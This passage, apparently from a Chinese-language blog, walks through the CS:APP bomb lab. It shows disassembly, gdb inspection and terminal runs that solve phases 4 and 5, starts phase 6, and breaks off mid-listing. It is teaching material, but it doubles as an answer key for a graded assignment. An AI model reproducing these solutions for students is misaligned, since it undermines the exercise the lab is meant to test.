better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string">2 707</span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb         </span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string">3 256</span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string">4 389 </span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32 </span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string">5 206</span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32 </span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string">6 682</span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string">7 327</span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>正如之前所分析的，在这两个数字之后加入任意内容都不影响我们第三个短语的成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string">7 327 ardxwe 158</span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><p>一切都是那么的自然</p><h4 id="第四个短语"><a href="#第四个短语" class="headerlink" title="第四个短语"></a>第四个短语</h4><p>查看 main 函数 54-56 行：</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">400e86:    e8 <span class="number">13</span> <span class="number">06</span> <span class="number">00</span> <span class="number">00</span>           callq  40149e &lt;read_line&gt;</span><br><span class="line">400e8b:    <span class="number">48</span> <span class="number">89</span> c7                 <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">400e8e:    e8 <span class="number">79</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>           callq  40100c &lt;phase_4&gt;</span><br></pre></td></tr></table></figure><p>输入字符的指针传递给 phase_4 作为第一个参数，查看 phase_4 对应位置汇编代码。由于这里 phase_4 调用了 func4 函数，因此将 func4 一并贴出。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">0000000000400fce &lt;func4&gt;:</span><br><span class="line">  400fce:    <span class="number">48</span> <span class="number">83</span> ec <span class="number">08</span>              <span class="keyword">sub</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line">  400fd2:    <span class="number">89</span> d0                    <span class="keyword">mov</span>    %edx,%eax</span><br><span class="line">  400fd4:    <span class="number">29</span> f0                    <span class="keyword">sub</span>    %esi,%eax</span><br><span class="line">  400fd6:    <span class="number">89</span> c1                    <span class="keyword">mov</span>    %eax,%ecx</span><br><span class="line">  400fd8:    c1 e9 1f                 <span class="keyword">shr</span>    <span class="number">$0</span>x1f,%ecx</span><br><span class="line">  400fdb:    <span class="number">01</span> c8                    <span class="keyword">add</span>    %ecx,%eax</span><br><span class="line">  400fdd:    d1 f8                    <span class="keyword">sar</span>    %eax</span><br><span class="line">  400fdf:    <span class="number">8d</span> 0c <span class="number">30</span>                 <span class="keyword">lea</span>    (%rax,%rsi,<span class="number">1</span>),%ecx</span><br><span class="line">  400fe2:    <span class="number">39</span> f9                    <span class="keyword">cmp</span>    %edi,%ecx</span><br><span class="line">  400fe4:    7e 0c                    <span class="keyword">jle</span>    400ff2 &lt;func4+<span class="number">0x24</span>&gt;</span><br><span class="line">  400fe6:    <span class="number">8d</span> <span class="number">51</span> ff                 <span class="keyword">lea</span>    -<span class="number">0x1</span>(%rcx),%edx</span><br><span class="line">  400fe9:    e8 e0 ff ff ff           callq  400fce &lt;func4&gt;</span><br><span class="line">  400fee:    <span class="number">01</span> c0                    <span class="keyword">add</span>    %eax,%eax</span><br><span class="line">  400ff0:    eb <span class="number">15</span>                    <span class="keyword">jmp</span>    <span class="number">401007</span> &lt;func4+<span class="number">0x39</span>&gt;</span><br><span class="line">  400ff2:    b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  400ff7:    <span class="number">39</span> f9                    <span class="keyword">cmp</span>    %edi,%ecx</span><br><span class="line">  400ff9:    <span class="number">7d</span> 0c                    <span class="keyword">jge</span>    <span class="number">401007</span> &lt;func4+<span class="number">0x39</span>&gt;</span><br><span class="line">  400ffb:    <span class="number">8d</span> <span class="number">71</span> <span class="number">01</span>                 <span class="keyword">lea</span>    <span class="number">0x1</span>(%rcx),%esi</span><br><span class="line">  400ffe:    e8 cb ff ff ff           callq  400fce &lt;func4&gt;</span><br><span class="line">  <span class="number">401003</span>:    <span class="number">8d</span> <span class="number">44</span> <span class="number">00</span> <span class="number">01</span>              <span class="keyword">lea</span>    <span class="number">0x1</span>(%rax,%rax,<span class="number">1</span>),%eax</span><br><span class="line">  <span class="number">401007</span>:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">08</span>              <span class="keyword">add</span>    <span class="number">$0</span>x8,%rsp</span><br><span class="line">  40100b:    c3                       retq   </span><br><span class="line"></span><br><span class="line">000000000040100c &lt;phase_4&gt;:</span><br><span class="line">  40100c:    <span class="number">48</span> <span class="number">83</span> ec <span class="number">18</span>              <span class="keyword">sub</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line">  <span class="number">401010</span>:    <span class="number">48</span> <span class="number">8d</span> 4c <span class="number">24</span> 0c           <span class="keyword">lea</span>    <span class="number">0xc</span>(%rsp),%rcx</span><br><span class="line">  <span class="number">401015</span>:    <span class="number">48</span> <span class="number">8d</span> <span class="number">54</span> <span class="number">24</span> <span class="number">08</span>           <span class="keyword">lea</span>    <span class="number">0x8</span>(%rsp),%rdx</span><br><span class="line">  40101a:    be cf <span class="number">25</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x4025cf,%esi</span><br><span class="line">  40101f:    b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  <span class="number">401024</span>:    e8 c7 fb ff ff           callq  400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">  <span class="number">401029</span>:    <span class="number">83</span> f8 <span class="number">02</span>                 <span class="keyword">cmp</span>    <span class="number">$0</span>x2,%eax</span><br><span class="line">  40102c:    <span class="number">75</span> <span class="number">07</span>                    <span class="keyword">jne</span>    <span class="number">401035</span> &lt;phase_4+<span class="number">0x29</span>&gt;</span><br><span class="line">  40102e:    <span class="number">83</span> 7c <span class="number">24</span> <span class="number">08</span> 0e           cmpl   <span class="number">$0</span>xe,<span class="number">0x8</span>(%rsp)</span><br><span class="line">  <span class="number">401033</span>:    <span class="number">76</span> <span class="number">05</span>                    <span class="keyword">jbe</span>    40103a &lt;phase_4+<span class="number">0x2e</span>&gt;</span><br><span class="line">  <span class="number">401035</span>:    e8 <span class="number">00</span> <span class="number">04</span> <span class="number">00</span> <span class="number">00</span>           callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  40103a:    ba 0e <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>xe,%edx</span><br><span class="line">  40103f:    be <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x0,%esi</span><br><span class="line">  <span class="number">401044</span>:    8b 7c <span class="number">24</span> <span class="number">08</span>              <span class="keyword">mov</span>    <span class="number">0x8</span>(%rsp),%edi</span><br><span class="line">  <span class="number">401048</span>:    e8 <span class="number">81</span> ff ff ff           callq  400fce &lt;func4&gt;</span><br><span class="line">  <span class="number">40104d</span>:    <span class="number">85</span> c0                    <span class="keyword">test</span>   %eax,%eax</span><br><span class="line">  40104f:    <span class="number">75</span> <span class="number">07</span>                    <span class="keyword">jne</span>    <span class="number">401058</span> &lt;phase_4+<span class="number">0x4c</span>&gt;</span><br><span class="line">  <span class="number">401051</span>:    <span class="number">83</span> 7c <span class="number">24</span> 0c <span class="number">00</span>           cmpl   <span class="number">$0</span>x0,<span class="number">0xc</span>(%rsp)</span><br><span class="line">  <span class="number">401056</span>:    <span class="number">74</span> <span class="number">05</span>                    <span class="keyword">je</span>     <span class="number">40105d</span> &lt;phase_4+<span class="number">0x51</span>&gt;</span><br><span class="line">  <span class="number">401058</span>:    e8 <span class="built_in">dd</span> <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>           callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">40105d</span>:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">18</span>              <span class="keyword">add</span>    <span class="number">$0</span>x18,%rsp</span><br><span class="line">  <span class="number">401061</span>:    c3                       retq</span><br></pre></td></tr></table></figure><ul><li>29-33： 需要两个参数, 至于参数具体格式, 可以通过查看 esi 寄存器存储的内存地址内容</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p (char*)0x4025cf</span><br><span class="line"><span class="variable">$2</span> = 0x4025cf <span class="string">&quot;%d %d&quot;</span></span><br></pre></td></tr></table></figure><p>显然，刚好需要两个整数。</p><ul><li>34-47：第一个参数 &lt;= 15，调用 func4的返回值应该是0,第二个数字是0</li></ul><p>仔细分析 func4， 15 &gt;&gt; 1 == 7,如果输入是7,刚好满足 jle 和 jge 的条件， 而且 rax = 0， 满足题意，故答案为(7, 0)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string">0 207 </span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string">7 0</span></span><br><span class="line"><span class="string">So you got that one.  Try this one.</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure><h4 id="第五个短语"><a href="#第五个短语" class="headerlink" title="第五个短语"></a>第五个短语</h4><p>查看 main 函数第 60-62 行:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">400ea2:    e8 f7 <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>           callq  40149e &lt;read_line&gt;</span><br><span class="line">400ea7:    <span class="number">48</span> <span class="number">89</span> c7                 <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">400eaa:    e8 b3 <span class="number">01</span> <span class="number">00</span> <span class="number">00</span>           callq  <span class="number">401062</span> &lt;phase_5&gt;</span><br></pre></td></tr></table></figure><p>查看 phase_5 对应汇编代码:</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000000000401062</span> &lt;phase_5&gt;:</span><br><span class="line">  <span class="number">401062</span>:    <span class="number">53</span>                       <span class="keyword">push</span>   %rbx</span><br><span class="line">  <span class="number">401063</span>:    <span class="number">48</span> <span class="number">83</span> ec <span class="number">20</span>              <span class="keyword">sub</span>    <span class="number">$0</span>x20,%rsp</span><br><span class="line">  <span class="number">401067</span>:    <span class="number">48</span> <span class="number">89</span> fb                 <span class="keyword">mov</span>    %rdi,%rbx</span><br><span class="line">  40106a:    <span class="number">64</span> <span class="number">48</span> 8b <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span>     <span class="keyword">mov</span>    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  <span class="number">401071</span>:    <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  <span class="number">401073</span>:    <span class="number">48</span> <span class="number">89</span> <span class="number">44</span> <span class="number">24</span> <span class="number">18</span>           <span class="keyword">mov</span>    %rax,<span class="number">0x18</span>(%rsp)</span><br><span class="line">  <span class="number">401078</span>:    <span class="number">31</span> c0                    <span class="keyword">xor</span>    %eax,%eax</span><br><span class="line">  40107a:    e8 9c <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>           callq  40131b &lt;string_length&gt;</span><br><span class="line">  40107f:    <span class="number">83</span> f8 <span class="number">06</span>                 <span class="keyword">cmp</span>    <span class="number">$0</span>x6,%eax</span><br><span class="line">  <span class="number">401082</span>:    <span class="number">74</span> 4e                    <span class="keyword">je</span>     4010d2 &lt;phase_5+<span class="number">0x70</span>&gt;</span><br><span class="line">  <span class="number">401084</span>:    e8 b1 <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>           callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  <span class="number">401089</span>:    eb <span class="number">47</span>                    <span class="keyword">jmp</span>    4010d2 &lt;phase_5+<span class="number">0x70</span>&gt;</span><br><span class="line">  40108b:    0f b6 0c <span class="number">03</span>              movzbl (%rbx,%rax,<span class="number">1</span>),%ecx</span><br><span class="line">  40108f:    <span class="number">88</span> 0c <span class="number">24</span>                 <span class="keyword">mov</span>    %cl,(%rsp)</span><br><span class="line">  <span class="number">401092</span>:    <span class="number">48</span> 8b <span class="number">14</span> <span class="number">24</span>              <span class="keyword">mov</span>    (%rsp),%rdx</span><br><span class="line">  <span class="number">401096</span>:    <span class="number">83</span> e2 0f                 <span class="keyword">and</span>    <span class="number">$0</span>xf,%edx</span><br><span class="line">  <span class="number">401099</span>:    0f b6 <span class="number">92</span> b0 <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>     movzbl <span class="number">0x4024b0</span>(%rdx),%edx</span><br><span class="line">  4010a0:    <span class="number">88</span> <span class="number">54</span> <span class="number">04</span> <span class="number">10</span>              <span class="keyword">mov</span>    %dl,<span class="number">0x10</span>(%rsp,%rax,<span class="number">1</span>)</span><br><span class="line">  4010a4:    <span class="number">48</span> <span class="number">83</span> c0 <span class="number">01</span>              <span class="keyword">add</span>    <span class="number">$0</span>x1,%rax</span><br><span class="line">  4010a8:    <span class="number">48</span> <span class="number">83</span> f8 <span class="number">06</span>              <span class="keyword">cmp</span>    <span class="number">$0</span>x6,%rax</span><br><span class="line">  4010ac:    <span class="number">75</span> <span class="built_in">dd</span>                    <span class="keyword">jne</span>    40108b &lt;phase_5+<span class="number">0x29</span>&gt;</span><br><span class="line">  4010ae:    c6 <span class="number">44</span> <span class="number">24</span> <span class="number">16</span> <span class="number">00</span>           movb   <span class="number">$0</span>x0,<span class="number">0x16</span>(%rsp)</span><br><span class="line">  4010b3:    be 5e <span class="number">24</span> <span class="number">40</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x40245e,%esi</span><br><span class="line">  4010b8:    <span class="number">48</span> <span class="number">8d</span> 7c <span class="number">24</span> <span class="number">10</span>           <span class="keyword">lea</span>    <span class="number">0x10</span>(%rsp),%rdi</span><br><span class="line">  4010bd:    e8 <span class="number">76</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>           callq  <span class="number">401338</span> &lt;strings_not_equal&gt;</span><br><span class="line">  4010c2:    <span class="number">85</span> c0                    <span class="keyword">test</span>   %eax,%eax</span><br><span class="line">  4010c4:    <span class="number">74</span> <span class="number">13</span>                    <span class="keyword">je</span>     4010d9 &lt;phase_5+<span class="number">0x77</span>&gt;</span><br><span class="line">  4010c6:    e8 6f <span class="number">03</span> <span class="number">00</span> <span class="number">00</span>           callq  40143a &lt;explode_bomb&gt;</span><br><span class="line">  4010cb:    0f 1f <span class="number">44</span> <span class="number">00</span> <span class="number">00</span>           nopl   <span class="number">0x0</span>(%rax,%rax,<span class="number">1</span>)</span><br><span class="line">  4010d0:    eb <span class="number">07</span>                    <span class="keyword">jmp</span>    4010d9 &lt;phase_5+<span class="number">0x77</span>&gt;</span><br><span class="line">  4010d2:    b8 <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>           <span class="keyword">mov</span>    <span class="number">$0</span>x0,%eax</span><br><span class="line">  4010d7:    eb b2                    <span class="keyword">jmp</span>    40108b &lt;phase_5+<span class="number">0x29</span>&gt;</span><br><span class="line">  4010d9:    <span class="number">48</span> 8b <span class="number">44</span> <span class="number">24</span> <span class="number">18</span>           <span class="keyword">mov</span>    <span class="number">0x18</span>(%rsp),%rax</span><br><span class="line">  4010de:    <span class="number">64</span> <span class="number">48</span> <span class="number">33</span> <span class="number">04</span> <span class="number">25</span> <span class="number">28</span> <span class="number">00</span>     <span class="keyword">xor</span>    %fs:<span class="number">0x28</span>,%rax</span><br><span class="line">  4010e5:    <span class="number">00</span> <span class="number">00</span> </span><br><span class="line">  4010e7:    <span class="number">74</span> <span class="number">05</span>                    <span class="keyword">je</span>     4010ee &lt;phase_5+<span class="number">0x8c</span>&gt;</span><br><span class="line">  4010e9:    e8 <span class="number">42</span> fa ff ff           callq  400b30 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">  4010ee:    <span class="number">48</span> <span class="number">83</span> c4 <span class="number">20</span>              <span class="keyword">add</span>    <span class="number">$0</span>x20,%rsp</span><br><span class="line">  4010f2:    5b                       <span class="keyword">pop</span>    %rbx</span><br><span class="line">  4010f3:    c3                       retq</span><br></pre></td></tr></table></figure><ul><li>9-10: 字符串长度为6</li><li>13-41： 每个字符对应字节后四位作为偏移，以 0x4024b0 作为基地址，最终和 0x40245e 内存地址做比较。<br>使用 gdb 查看相应内存地址内容:</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p (char*)0x40245e</span><br><span class="line"><span class="variable">$1</span> = 0x40245e <span class="string">&quot;flyers&quot;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p (char*)0x4024b0</span><br><span class="line"><span class="variable">$2</span> = 0x4024b0 &lt;array&gt; <span class="string">&quot;maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?&quot;</span></span><br></pre></td></tr></table></figure><p>为了得到 flyers, 需要的偏移地址为 9fe567，理论上 ASCII 码可打印字符均可。</p><p>故答案为 9?&gt;567 或者 y_^UVW 等等 只要满足最后四位要求即可。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb</span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string">7 327</span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string">7 0</span></span><br><span class="line"><span class="string">So you got that one.  Try this one.</span></span><br><span class="line"><span class="string">9?&gt;567</span></span><br><span class="line"><span class="string">Good work!  On to the next...</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">➜  bomb git:(master) ./bomb         </span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line"><span class="built_in">which</span> to blow yourself up. Have a nice day!</span><br><span class="line">Border relations with Canada have never been better.</span><br><span class="line">Phase 1 defused. How about the next one?</span><br><span class="line">1 2 4 8 16 32</span><br><span class="line">That<span class="string">&#x27;s number 2.  Keep going!</span></span><br><span class="line"><span class="string">7 327</span></span><br><span class="line"><span class="string">Halfway there!</span></span><br><span class="line"><span class="string">7 0</span></span><br><span class="line"><span class="string">So you got that one.  Try this one.</span></span><br><span class="line"><span class="string">y_^UVW</span></span><br><span class="line"><span class="string">Good work!  On to the next...</span></span><br></pre></td></tr></table></figure><p>我们成功了!</p><h4 id="第六个短语"><a href="#第六个短语" class="headerlink" title="第六个短语"></a>第六个短语</h4><p>查看 main 函数第 66-68 行</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">400ebe:    e8 <span class="built_in">db</span> <span class="number">05</span> <span class="number">00</span> <span class="number">00</span>           callq  40149e &lt;read_line&gt;</span><br><span class="line">400ec3:    <span class="number">48</span> <span class="number">89</span> c7                 <span class="keyword">mov</span>    %rax,%rdi</span><br><span class="line">400ec6:    e8 <span class="number">29</span> <span class="number">02</span> <span class="number">00</span> <span class="number">00</span>           callq  4010f4 &lt;phase_6&gt;</span><br></pre></td></tr></table></figure><p>查看内存地址 0x4010f4</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 